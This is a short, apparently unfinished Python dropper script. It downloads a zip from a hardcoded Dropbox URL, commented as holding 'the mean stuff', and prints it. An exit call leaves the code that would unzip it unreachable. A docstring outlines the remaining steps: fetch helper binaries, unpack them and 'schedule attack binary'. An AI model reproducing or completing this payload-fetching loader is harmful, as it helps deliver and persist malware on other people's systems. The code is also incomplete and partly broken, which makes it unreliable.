#!/usr/bin/env python3

import io
import os
import sys
import requests
import zipfile

def main():
    root = os.path.join('..', os.getcwd())
    #hardcode where the mean stuff lives
    url = "https://uc678aaf33e0ee4c61d4b68281f2.dl.dropboxusercontent.com/cd/0/get/Av0uZ3NfPko55_1m7sssnW8ZvF5aj-HrSCEa38PndOrMwWKqahMVMcaWagxDiwQywBWtJQifoTual9X8rOdSzTndNEB881PmsDXsqoEpo9GYxlZC9X25FqoJ7Kamyj4TcWs/file"
    resp = requests.get(url)
    print(resp.content)
    sys.exit(0)
    #take care of errors later
    zip = zipfile.ZipFile(io.BytesIO(resp.content))
    zip.extractall()

    """
    Step 1: download assisting binaries - not done
    Step 2: move to dir and unzip - not done
    Step 3: schedule attack binary - not done
    """

if __name__ == '__main__':
    main()
